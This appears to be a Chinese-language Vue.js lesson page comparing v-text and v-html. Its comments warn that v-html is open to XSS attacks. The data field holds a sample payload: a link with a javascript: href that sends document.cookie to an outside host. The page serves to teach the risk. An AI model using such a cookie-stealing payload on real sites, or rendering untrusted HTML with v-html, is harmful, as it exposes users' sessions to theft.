
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>v-html</title>
    <script src="../vue.js"></script>
</head> 
<body>
    <!--  
        v-bind 单向绑定解析表达式，可简写为 :xxx
        v-model 双向数据绑定
        v-for 遍历
        v-on 绑定事件监听，可简写为@
        v-if 条件渲染（动态控制节点是否存在）
        v-else-if
        v-else
        v-show 条件渲染（同代控制节点是否展示）

        v-text
            - 向其所在的节点中渲染文本内容
            - v-text会替换掉节点中的内容，{{xxx}}则不会

        v-html:
            - document.cookie !干坏事
            - 存在安全性问题
            - 称作 xss 攻击
            - 一定要在可信的内容上使用 v-html
    -->
    <div id="root">
        <div>{{name}}</div>
        <div v-text="name"></div>

        <div v-html="str"></div>
    </div>

    <script>
        Vue.config.productionTip = false;

        const vm = new Vue({
            el: "#root",
            data: {
                name: 'world',
                str: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>尚硅谷</a>'
            }
        })
    </script>
</body>
</html>
